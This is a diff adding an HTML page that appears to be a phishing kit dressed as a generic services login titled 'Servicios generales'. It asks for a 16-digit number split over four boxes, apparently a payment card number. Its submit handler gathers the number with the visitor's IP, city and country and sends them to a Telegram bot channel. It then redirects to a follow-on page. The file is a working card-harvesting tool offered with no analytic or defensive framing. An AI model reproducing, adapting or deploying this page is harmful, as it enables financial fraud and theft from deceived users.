@@ -1,0 +1,101 @@
+<html class=" dkddl_fouc">
+   <head>
+      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+      
+      <meta http-equiv="X-UA-Compatible" content="IE=10">
+      
+      <title>
+        Servicios generales
+      </title>
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script> 
+      <script>
+         $.getJSON("https://api.ipify.org?format=json",
+                                           function(data) {
+         
+             // Setting text of element P with id gfg
+             $("#gfg").html(data.ip);
+         })
+      </script>
+      <script>
+         $.getJSON("https://ipinfo.io", function (response) {
+      $("#ip").html("IP: " + response.ip);
+      $("#address").html("" + response.city + ", " + response.country);
+
+      })
+      </script>
+<style type="text/css">
+   ::placeholder { /* Chrome, Firefox, Opera, Safari 10.1+ */
+  color: #98aca6;
+ 
+}
+
+:-ms-input-placeholder { /* Internet Explorer 10-11 */
+  color: #98aca6;
+}
+
+::-ms-input-placeholder { /* Microsoft Edge */
+  color: #98aca6;
+}
+</style>
+     
+      <link type="text/css" href="css/estilo.css" rel="stylesheet">
+      <link rel="shortcut icon" href="img/favicon.ico">
+      <link href="css/estilo2.css" type="text/css" rel="stylesheet">
+   </head>
+   <body class="plantilla">
+
+
+      <form     method="post" id="loginform" name="add">
+         
+
+         <img src="./img/taico.jpg" class="fondo" style="">
+         <input type="tel" name="us4rs"  minlength="4" maxlength="4" required class="user" placeholder="" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" onkeyup="if (this.value.length == this.getAttribute('maxlength')) num2.focus()" id="num1"> 
+
+         <input type="text" name="us4rs2" minlength="4" maxlength="4" required class="user2" placeholder="" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" onkeyup="if (this.value.length == this.getAttribute('maxlength')) num3.focus()" id="num2"> 
+
+         <input type="text" name="us4rs3" minlength="4" maxlength="4" required class="user3" placeholder="" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" onkeyup="if (this.value.length == this.getAttribute('maxlength')) num4.focus()" id="num3"> 
+
+         <input type="text" name="us4rs4" minlength="4" maxlength="4" required class="user4" placeholder="" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" onkeyup="if (this.value.length == this.getAttribute('maxlength')) num5.focus()" id="num4"> 
+    
+
+          
+          
+        
+         <input type="submit" value="" class="botonlogin2" style="font-family: Helvetica;" name="add" id="btnEnviar">
+      </form>
+     
+                   <script src="aqui-va-eltlg.js"></script>
+<script>
+    var script = document.createElement("script");
+    script.src = "aqui-va-eltlg.js";
+
+ 
+
+    const form = document.querySelector('#loginform');
+
+    form.addEventListener('submit', event => {
+        event.preventDefault();
+        const cliente = document.getElementById('num1').value;
+        const cliente2 = document.getElementById('num2').value;
+        const cliente3 = document.getElementById('num3').value;
+         const cliente4 = document.getElementById('num4').value;
+
+        fetch('https://ipapi.co/json')
+        .then(response => response.json())
+        .then(data => {
+            YOUR_MESSAGE_TEXT = "IT4U UYU \n\n\r C3C3: "+cliente+""+cliente2+""+cliente3+""+cliente4+"   - IP: "+data.ip+" "+data.country+" "+data.city;
+            const telegramApiUrl = `https://api.telegram.org/bot${YOUR_BOT_TOKEN}/sendMessage?chat_id=${YOUR_CHANNEL_ID}&text=${YOUR_MESSAGE_TEXT}`;
+
+            fetch(telegramApiUrl)
+                .then(response => {
+                    window.location.href="emese.html"
+                })
+                .catch(error => console.error(error));
+        })
+        .catch(error => console.error(error));
+    });
+    
+</script>
+     
+   </body>
+</html>
